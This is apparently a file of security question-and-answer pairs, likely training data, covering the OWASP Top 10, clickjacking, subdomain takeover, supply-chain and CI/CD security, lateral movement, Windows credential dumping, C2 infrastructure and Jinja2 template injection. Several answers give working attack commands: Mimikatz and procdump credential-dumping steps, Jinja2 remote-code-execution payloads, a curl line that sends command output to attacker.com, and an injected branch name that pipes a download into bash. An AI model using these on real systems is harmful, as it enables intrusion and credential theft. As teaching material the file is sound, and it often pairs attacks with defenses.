'''OWASP Top 10 2021: A01 Broken Access Control (moved from #5 to #1): missing authorization checks, IDOR, CORS misconfiguration, path traversal; test: attempt to access other users data by changing IDs, test admin endpoints without admin role. A02 Cryptographic Failures: sensitive data in HTTP (not HTTPS), weak ciphers, hardcoded keys, cleartext passwords in DB; test: check HTTPS enforcement, inspect response for sensitive data, review cipher suite with testssl.sh. A03 Injection (SQL, Command, LDAP, SSTI): user input in queries/commands; test: fuzz all inputs with SQLmap, manual injection testing, SAST scan. A04 Insecure Design: missing security controls at design level, no rate limiting, no fraud controls; test: business logic testing, abuse case analysis. A05 Security Misconfiguration: default credentials, open admin interfaces, unnecessary features enabled, missing security headers, verbose error messages; test: scan with Nikto, check security headers at securityheaders.com, try default credentials. A06 Vulnerable and Outdated Components: known CVEs in libraries, frameworks, OS; test: SCA with Snyk/Dependabot, check CVE for all versions. A07 Identification and Authentication Failures: weak passwords allowed, no MFA, insecure session management; test: test lockout, session fixation, check cookie flags. A08 Software and Data Integrity Failures: CI/CD pipeline compromise, insecure deserialization, unsigned updates; test: check SRI hashes on CDN scripts, test deserialization endpoints. A09 Security Logging and Monitoring Failures: no logging of auth failures, insufficient log detail; test: verify security events are logged, test if alerts fire. A10 Server-Side Request Forgery (SSRF): server fetches attacker-specified URL; test: all URL parameters with internal IPs, cloud metadata endpoint.''')

p("How do you exploit clickjacking with X-Frame-Options missing?",
'''Clickjacking exploitation when X-Frame-Options not set: (1) Verify frameability: create test HTML: <iframe src="https://target.com/sensitive-action"> and load in browser; if target loads in iframe, it is frameable; also check CSP frame-ancestors header. (2) Identify high-value target actions: one-click actions on authenticated pages: change email, change password, transfer funds, delete account, publish/post, grant permission; target must execute without additional input (or with predictable input). (3) Construct attack page: overlay transparent iframe over decoy buttons: iframe style="opacity:0.01; position:absolute; top:OFFSET; left:OFFSET; width:TARGET_WIDTH; height:TARGET_HEIGHT"; position iframe so the sensitive button aligns with decoy button victim sees; victim clicks decoy, actually clicks target button inside iframe. (4) UI tuning: use opacity:0 to make iframe invisible; use CSS pointer-events to align clickable area; test with opacity:0.5 to verify alignment then set to 0 for attack. (5) Multi-step clickjacking: for multi-click flows, sequence multiple iframe positions; use JavaScript to move iframe or swap iframes between clicks. Dragjacking: use HTML drag-and-drop to extract sensitive data (token, CSRF token visible in DOM) by dragging to attacker-controlled textarea. Tapjacking: mobile version -- touch events on hidden overlay. Defense: X-Frame-Options: DENY or SAMEORIGIN response header; Content-Security-Policy: frame-ancestors none; both headers for broad coverage; X-Frame-Options not supported by some older browsers (CSP covers modern browsers). JavaScript framebusting (weak): if (top != self) top.location = self.location; bypassed by sandbox iframe attribute.''')

p("How do you perform subdomain takeover?",
'''Subdomain takeover: DNS CNAME record points to external service; service account deleted/expired but DNS record remains; attacker registers the service and controls the subdomain. Example: app.company.com CNAME company.azurewebsites.net; company stops using Azure Web App and deletes it; company.azurewebsites.net is now available; attacker registers that Azure Web App hostname; now controls app.company.com. Impact: serve phishing page on legitimate company subdomain; bypass subdomain-based CORS policies (attacker domain now whitelisted); steal cookies if SameSite=None or if domain cookie set on parent domain; receive emails if MX records affected; OAuth redirect_uri validation bypassed (legitimate subdomain). Vulnerable services: Amazon S3 (bucket doesn't exist), Azure App Service (app deleted), GitHub Pages (repo deleted or unconfigured), Heroku (app deleted), Fastly, SendGrid, HubSpot, Tumblr, many others. Discovery: run subdomain enumeration (amass, subfinder); for each subdomain, check CNAME chain: dig CNAME subdomain; follow chain to canonical name; check if canonical service is available (S3 bucket: NoSuchBucket error; Azure: App not configured; GitHub Pages: no repository). Tools: subjack (automated subdomain takeover scanner); can-i-take-over-xyz (GitHub repo listing vulnerable services and fingerprints); nuclei with takeover templates. Exploitation: register the pointing service with the exact hostname/bucket name; host proof-of-concept page. Remediation: remove stale DNS records when decommissioning services; audit DNS records quarterly for orphaned CNAMEs; use DNS record management lifecycle tracking.''')

p("What is a supply chain attack and how do you defend against it?",
'''Supply chain attack: compromise software or infrastructure through a trusted third-party component or vendor. Types: (1) Source code compromise: SolarWinds (SUNBURST, 2020) -- attackers with access to SolarWinds build environment injected malicious code into Orion updates; 18,000 organisations downloaded trojanised update; update was signed by SolarWinds certificate; passed all validation. (2) Dependency confusion: attacker publishes package to public npm/PyPI registry with same name as internal private package but higher version number; developer or CI builds pull public package instead of internal; executes attacker code in build environment; discovered by Alex Birsan 2021; affected Apple, Microsoft, PayPal. (3) Typosquatting: attacker publishes colourama (vs colorama), reqeusts (vs requests); developers make typo in install command. (4) Compromised contributor: social engineering or account takeover of legitimate open-source maintainer; malicious commit added to popular library. (5) CI/CD pipeline compromise: compromise GitHub Actions, Jenkins, TeamCity; malicious workflow exfiltrates secrets, injects backdoor into build artifacts. Defense: (1) Software Bill of Materials (SBOM): track all dependencies and their versions; Syft, CycloneDX; detect unexpected changes. (2) Dependency pinning: pin to exact version and hash (npm package-lock.json with integrity hashes, Python requirements.txt with --hash). (3) Private package mirror: npm proxy, PyPI mirror; only approved packages in mirror. (4) Code signing verification: verify signatures on all dependencies; sigstore/cosign for container images and packages. (5) CI/CD security: minimal permissions for CI; separate build environments; review pipeline changes.''')

p("How do you secure CI/CD pipelines?",
'''CI/CD pipeline security: pipelines run privileged code and have access to production secrets, cloud credentials, and deployment mechanisms. Threat model: compromised pipeline = arbitrary code execution in privileged context = code deployed to production, secrets exfiltrated, infrastructure modified. Key risks: (1) Secret exposure: secrets in environment variables, pipeline YAML files, or build logs; secrets printed during verbose output; debug output reveals credentials. (2) Pipeline injection: user-controlled data (branch name, PR title, issue body) interpolated into pipeline YAML or script without sanitisation; attacker creates branch named $(curl attacker.com | bash) to exfiltrate secrets. (3) Dependency poisoning: build pulls malicious package; builds trust package installation from internet without verification. (4) Excessive permissions: service account with AdministratorAccess for all deployment targets instead of least-privilege per-environment. (5) Unprotected main branch: any contributor can merge malicious code to main triggering automated deployment. Hardening: (1) Separate secrets per environment; use OIDC federation (GitHub Actions OIDC with AWS IAM -- no static credentials needed; ephemeral short-lived tokens per workflow run). (2) Restrict where privileged jobs run: protect main branch; require PR review; only run deployment jobs on protected branches. (3) Least-privilege service accounts: deploy-dev role cannot deploy to prod; separate credentials per environment. (4) Pipeline-as-code review: treat pipeline YAML as code; require review for pipeline changes. (5) Dependency integrity: use lock files with hashes; private package mirrors for internal packages; SCA scan in pipeline. (6) Immutable artifacts: build once (create signed artifact), deploy everywhere (same artifact to each env); prevents environment-specific builds that could differ. (7) Audit logging: log all pipeline runs, secret accesses, deployment events.''')

p("Explain the concept of zero trust architecture.",
'''Zero Trust: security model where no user, device, or network segment is trusted by default -- even inside the corporate perimeter. Traditional model: trust everything inside the firewall; once on corporate network, broad access assumed; VPN provides perimeter access; insider threats and lateral movement flourish. Zero Trust principles: (1) Verify explicitly: authenticate and authorise every request based on all available signals (identity, location, device health, service/workload, data classification); not just verify once at network boundary. (2) Least privilege access: grant minimum access needed for task; just-in-time and just-enough-access; time-limited; constrained resource scope. (3) Assume breach: design as if attacker is already inside; micro-segment networks; limit lateral movement; encrypt all traffic; collect telemetry; detect anomalies. Implementation components: Identity: strong MFA for all users; conditional access policies (block from unknown device, unknown country); privileged identity management with JIT elevation. Device: device compliance check before access (managed, patched, not jailbroken); mobile device management (MDM); device certificate. Network: microsegmentation; software-defined perimeter; network access limited to specific resources not entire subnet; ZTNA (Zero Trust Network Access) replaces VPN. Application: API gateway authentication for all internal apps; application-level access control; not just network-level. Data: classify data; encrypt in transit and at rest; DLP controls. Monitoring: continuous monitoring; behavioural analytics (UEBA); SIEM integration; real-time risk scoring. Frameworks: NIST SP 800-207 (Zero Trust Architecture); Microsoft Zero Trust adoption guide; Zscaler SASE; Palo Alto Prisma Access.''')

p("How do you perform reconnaissance on a target before an engagement?",
'''Passive reconnaissance (OSINT -- no direct target interaction): (1) WHOIS: domain registration info, registrant, nameservers, registration date; historical WHOIS via DomainTools reveals past ownership and infrastructure. (2) DNS: dig, nslookup, dnsx; enumerate A, AAAA, MX, NS, TXT, CNAME, SOA records; zone transfer attempt (dig axfr @ns1.target.com target.com -- rarely works but worth trying); Passive DNS databases (SecurityTrails, VirusTotal passivedns). (3) Certificate Transparency: crt.sh, certspotter; all SSL certs publicly logged; reveals subdomains, internal domain names, development hostnames. (4) Shodan / Censys: search for IP ranges, exposed services, banners, tech stack; Shodan: org:"Target Corp"; hostname:target.com; Censys: ip:RANGE. (5) Google dorks: site:target.com filetype:pdf (public documents with metadata); site:target.com inurl:admin; site:target.com ext:sql; cache:target.com/secret-page. (6) LinkedIn: employee names, job titles, org chart, technology mentions in job descriptions (Java, AWS, Kubernetes = tech stack); email format discovery (first.last@company.com). (7) GitHub: org:targetcompany password OR api_key OR secret OR access_token; leaked credentials, internal URLs, infrastructure details. (8) Job postings: tech stack, security tools used, compliance requirements. Active reconnaissance (light interaction, may be logged): (9) DNS brute force: dnsx, dnsrecon; wordlist of common subdomains. (10) Web tech: whatweb, wappalyzer, builtwith; CMS detection, server version. (11) Email security: test SPF, DMARC, DKIM via MXToolbox; weak email security = phishing opportunity.''')

p("What is lateral movement and which tools do attackers use?",
'''Lateral movement: techniques attackers use to progressively move through a network after initial compromise. Goals: access more systems; find sensitive data; escalate privileges; reach primary target. Remote service exploitation: PsExec (Sysinternals): creates service on remote host via admin share; requires admin credentials and SMB access; very noisy (Event 7045 new service). WMI (Windows Management Instrumentation): Win32_Process.Create for remote code execution; more stealthy than PsExec; Event 4688 if process auditing enabled. WinRM/PowerShell Remoting: Enter-PSSession, Invoke-Command; requires WinRM service running; port 5985 HTTP or 5986 HTTPS. Pass-the-Hash movement: CrackMapExec smb TARGET -u admin -H NTLM_HASH --local-auth to test hash on all targets; valid hash = lateral movement to any host where that account is local admin. Kerberos-based: Pass-the-Ticket with stolen TGT; Overpass-the-Hash (use NTLM hash to get Kerberos ticket); S4U2Self/S4U2Proxy for delegation abuse. Remote Desktop (RDP): xfreerdp, mstsc; requires credentials or certificate; restrictedAdmin mode allows PtH. Application-specific: SQL Server linked servers (execute query on linked server); Exchange impersonation; MSSQL xp_cmdshell. Tools: Metasploit (PSExec module, SMB relay module); Impacket suite (wmiexec, psexec, smbexec, atexec); Evil-WinRM; CrackMapExec (SMB, WMI, WINRM modules); Cobalt Strike (jump psexec, jump wmi, jump winrm commands in beacon). Detection: unusual process parents (WmiPrvSE, services.exe); Event 4624 Type 3 logon from unexpected source; new service creation (7045) from non-standard processes; SMB connections from workstations to other workstations.''')

p("How do you perform credential dumping on Windows?",
'''Credential dumping: extracting password hashes, cleartext credentials, or Kerberos tickets from Windows systems. LSASS memory (main target): Local Security Authority Subsystem Service stores credentials in memory; Mimikatz: privilege::debug; sekurlsa::logonpasswords (NTLM hashes, cleartext passwords if WDigest enabled, Kerberos tickets); sekurlsa::wdigest (WDigest cleartext -- only on Windows 7/Server 2008 or if reg key set); Procdump: procdump.exe -ma lsass.exe lsass.dmp (dump LSASS to file); transfer dump offline; analyze with Mimikatz: sekurlsa::minidump lsass.dmp; sekurlsa::logonpasswords. SAM database: local account hashes stored in SAM (C:\Windows\System32\config\SAM); encrypted by SYSKEY stored in SYSTEM hive; Mimikatz: lsadump::sam /system:SYSTEM /sam:SAM (from offline hives); reg save HKLM\SAM sam.hiv; reg save HKLM\SYSTEM system.hiv -- copy and extract. NTDS.dit (domain controller): Active Directory database; contains all domain user hashes; Mimikatz: lsadump::dcsync /domain:corp.local /all /csv (no local access to DC needed if you have replication rights). Volume Shadow Copy extraction: vssadmin create shadow /for=c:; copy shadow copy of NTDS.dit to extract. LSA Secrets: service account passwords, cached domain credentials (last 10 logins); Mimikatz: lsadump::secrets. Credential Manager: Windows Credential Manager stores passwords for mapped drives, websites; cmdkey /list; Mimikatz: sekurlsa::credman. Defense: Credential Guard (VBS-isolated LSASS; Mimikatz cannot access); PPL (Protected Process Light for LSASS); disable WDigest (HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest UseLogonCredential=0); limit who can debug processes; monitor LSASS access via Sysmon Event 10.''')

p("Explain red team infrastructure and C2 frameworks.",
'''Red team infrastructure: purpose-built attack infrastructure that obscures attacker origin and provides resilient command and control. Components: (1) Redirectors: intermediary servers between C2 and target; target beacons to redirector; redirector forwards to C2; if redirector discovered and blocked, swap it out without losing C2; use nginx/Apache with reverse proxy; CDN (Cloudflare) as redirector -- C2 traffic looks like CDN traffic. (2) Domain fronting: route C2 traffic through CDN; HTTP Host header points to C2 domain but TLS SNI and actual connection goes to CDN; CDN forwards internally to C2 domain; appears as connection to legitimate CDN. (3) Categorised domains: purchase aged domains with web history and reputation; categorise as IT/Technology in reputation databases before use; bypasses proxy category filtering. (4) Cloud infrastructure: use cloud providers (AWS EC2, Azure, DO, Vultr) for redirectors; different providers for different operations; pay with gift cards or crypto for attribution resistance. C2 Frameworks: Cobalt Strike (commercial, ~$5K/year): Malleable C2 profiles mimic legitimate traffic (Amazon, Bing, Google); team server for collaboration; listener types (HTTP, HTTPS, DNS, SMB); beacon payload; extensive post-ex toolkit; most popular commercial tool. Sliver (open source, Bishopfox): HTTP/HTTPS/DNS/mTLS C2; multi-player; implant generation; similar to Cobalt Strike. Havoc (open source): modern C2 with staged shellcode; Demon implant; good OPSEC. Brute Ratel C4 (commercial): designed to evade EDR; popular with threat actors. C2 OPSEC: rotate domains; use HTTPS with valid certificates; match beacon timing to legitimate traffic patterns; use legitimate cloud services (OneDrive, Dropbox) as C2 channel (C2-over-OneDrive).''')

p("How do you exploit Server-Side Template Injection in Jinja2?",
'''Jinja2 SSTI (Python Flask/Django Jinja2 templates): when user input is directly rendered as template without sanitisation. Detection: inject {{7*7}}; if 49 in response, Jinja2 SSTI confirmed; {{7*"7"}} returns 7777777 (confirms Jinja2 vs Twig which returns 49). Basic exploitation: Jinja2 has access to Python globals via __class__ attribute chain: {{"".__class__}} returns str class; {{"".__class__.__mro__}} returns method resolution order including object; {{"".__class__.__mro__[1].__subclasses__()}} lists all Python subclasses in memory. Find useful class: iterate subclasses to find subprocess.Popen or os._wrap_close or warnings.catch_warnings; RCE: {{"".__class__.__mro__[1].__subclasses__()[396]("id",shell=True,stdout=-1).communicate()}} (index may vary by Python version). Simpler RCE with request object: {{request.__class__.__mro__[1].__subclasses__()}} or {{config.__class__.__init__.__globals__["os"].popen("id").read()}}. Filter bypass (when curly braces or dots filtered): use request.args: {{request|attr(request.args.a)}} with URL param ?a=__class__; chain multiple attr() calls to avoid dots; use request.application.import_name to get Flask app; use _|int, _|string for type coercion. Blind SSTI (no reflection): exfiltrate via DNS: {{config.__class__.__init__.__globals__["os"].popen("curl http://attacker.com/$(id|base64)").read()}}. Read files: {{config.__class__.__init__.__globals__["open"]("/etc/passwd").read()}}. Tool: tplmap automates SSTI detection and exploitation across Jinja2, Twig, Freemarker, Smarty, etc.''')

